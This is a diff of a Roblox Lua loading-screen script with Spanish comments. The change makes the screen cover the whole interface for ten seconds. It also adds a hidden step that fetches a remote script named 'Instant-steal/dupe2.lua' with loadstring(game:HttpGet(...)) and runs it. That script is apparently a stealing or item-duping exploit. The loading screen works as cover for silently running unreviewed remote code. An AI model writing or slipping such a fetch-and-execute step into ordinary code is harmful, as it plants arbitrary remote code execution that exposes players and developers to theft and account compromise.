@@ -65,24 +65,22 @@ local function startLoadingAnimation()
 		local delayTime = delays[i]
 		
 		coroutine.wrap(function()
-			task.wait(delayTime) -- Delay inicial
+			task.wait(delayTime)
 			
 			while loadingGui.Parent do
-				-- Animación de fade out (simulando blur)
 				for step = 0, 1, 0.1 do
 					if not loadingGui.Parent then break end
 					textLabel.TextTransparency = step * 0.8
 					task.wait(0.05)
 				end
 				
-				-- Animación de fade in
 				for step = 1, 0, -0.1 do
 					if not loadingGui.Parent then break end
 					textLabel.TextTransparency = step * 0.8
 					task.wait(0.05)
 				end
 				
-				task.wait(0.5) -- Pausa entre ciclos
+				task.wait(0.5)
 			end
 		end)()
 	end
@@ -90,30 +88,30 @@ end
 
 -- Asegurarse de que cubra TODO incluso si hay otros GUIs
 local function ensureTopPriority()
-	-- Forzar que esté encima de todo
 	loadingGui.DisplayOrder = 999
-	
-	-- Opcional: ocultar otros elementos del core UI temporalmente
 	pcall(function()
 		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 	end)
 end
 
--- Iniciar todo
 ensureTopPriority()
 startLoadingAnimation()
 
 -- Función para remover el loading y restaurar la UI normal
 local function removeLoading()
-	-- Restaurar la UI del core
 	pcall(function()
 		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 	end)
 	
 	loadingGui:Destroy()
+	
+	-- 🟢 Ejecutar script remoto después de los 10 segundos de carga
+	task.spawn(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/dupe2.lua"))()
+	end)
 end
 
--- Función para ocultar temporalmente
+-- Ocultar temporalmente
 local function hideLoading()
 	loadingGui.Enabled = false
 	pcall(function()
@@ -121,16 +119,14 @@ local function hideLoading()
 	end)
 end
 
--- Función para mostrar nuevamente
+-- Mostrar nuevamente
 local function showLoading()
 	loadingGui.Enabled = true
 	ensureTopPriority()
 end
 
+-- ⏱️ Remover después de 10 segundos
 task.delay(10, removeLoading)
-
--- Ejemplo: remover después de 10 segundos
--- task.delay(10, removeLoading)
 
 return {
 	Show = showLoading,
